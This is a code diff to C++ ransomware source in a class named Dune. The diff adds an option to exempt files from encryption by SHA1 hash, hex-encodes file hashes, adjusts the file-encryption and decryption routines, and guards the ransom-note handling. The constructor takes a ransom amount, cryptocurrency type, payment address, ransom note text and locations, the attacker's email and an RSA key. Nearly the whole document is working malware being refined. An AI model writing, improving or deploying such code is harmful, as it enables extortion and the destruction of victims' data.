@@ -188,7 +188,7 @@ namespace dune
     class Dune
     {
     public:
-        Dune(double _ransom_amount, std::string _crypto_currency_type, std::string _address, std::string _user_message, std::vector<std::string> _user_note_locations, std::string email_of_hacker, std::string rsa_public_key_pem_format_of_hacker_for_decryption)
+        Dune(double _ransom_amount, std::string _crypto_currency_type, std::string _address, std::string _user_message, std::vector<std::string> _user_note_locations, std::string email_of_hacker, std::string rsa_public_key_pem_format_of_hacker_for_decryption, std::vector<std::string> excluded_files_sha1_hash_hex)
         {
             public_key_pem = rsa_public_key_pem_format_of_hacker_for_decryption;
             ransom_amount = _ransom_amount;
@@ -197,6 +197,7 @@ namespace dune
             user_message = _user_message;
             user_notes_locations = _user_note_locations;
             hacker_email = email_of_hacker;
+            exempt_files = excluded_files_sha1_hash_hex;
         };
         /* Must pass the Acknowledgement stucture */
         /* Creates thread use detatch to stop the hang up */
@@ -305,7 +306,7 @@ namespace dune
             fd.close();
             SHA1_Final(sha1_hash, &sha_ctx);
 
-            return std::string((const char *)sha1_hash, SHA_DIGEST_LENGTH);
+            return tools::chars_to_hex(std::string((const char *)sha1_hash, SHA_DIGEST_LENGTH));
         }
         static void encrypt_file(std::string full_path, std::string enc_key)
         {
@@ -340,7 +341,6 @@ namespace dune
                     break;
             }
             EVP_CIPHER_CTX_free(ctx);
-            EVP_CIPHER_meth_free((EVP_CIPHER *)cipher);
             fclose(infile);
             fclose(outfile);
         }
@@ -377,7 +377,6 @@ namespace dune
                     break;
             }
             EVP_CIPHER_CTX_free(ctx);
-            EVP_CIPHER_meth_free((EVP_CIPHER *)cipher);
             fclose(infile);
             fclose(outfile);
         }
@@ -477,7 +476,10 @@ namespace dune
                 {
                 }
             }
-            exempt_files.push_back(compute_file_hash(user_notes_locations[0]));
+            if (user_notes_locations.size() > 0)
+            {
+                exempt_files.push_back(compute_file_hash(user_notes_locations[0]));
+            }
             return success;
         }
     };
